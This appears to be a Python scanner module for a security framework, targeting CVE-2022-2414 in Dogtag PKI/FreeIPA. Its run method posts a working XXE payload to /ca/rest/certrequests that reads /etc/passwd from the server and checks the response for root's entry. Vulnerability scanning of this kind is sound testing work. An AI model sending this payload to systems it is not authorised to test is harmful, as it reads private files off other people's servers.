#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Access to external entities when parsing XML documents can lead to XML external entity (XXE) attacks."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'FreeIPA - XML Entity Injection Detection',
        'description': 'Access to external entities when parsing XML documents can lead to XML external entity (XXE) attacks. This flaw allows a remote attacker to potentially retrieve the content of arbitrary files by sending specially crafted HTTP requests.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'dogtag', 'freeipa', 'xxe', 'dogtagpki', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/webapp/Dogtag/Dogtag%20PKI%20XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2022-2414.md',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-2414',
            'https://github.com/dogtagpki/pki/pull/4021',
        ],
        'cve': 'CVE-2022-2414',
    }

    def run(self):
        path = '/ca/rest/certrequests'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/xml'}, data='<!--?xml version="1.0" ?-->\n<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>\n<CertEnrollmentRequest>\n  <Attributes/>\n  <ProfileID>&ent;</ProfileID>\n</CertEnrollmentRequest>\n')
        if not r or r.status_code != 400:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('PKIException',)
        header_any = ('application/xml',)
        body_regexes = ('root:.*:0:0:',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(severity='high', reason='FreeIPA - XML Entity Injection detected', path=path)
            return True
        return False

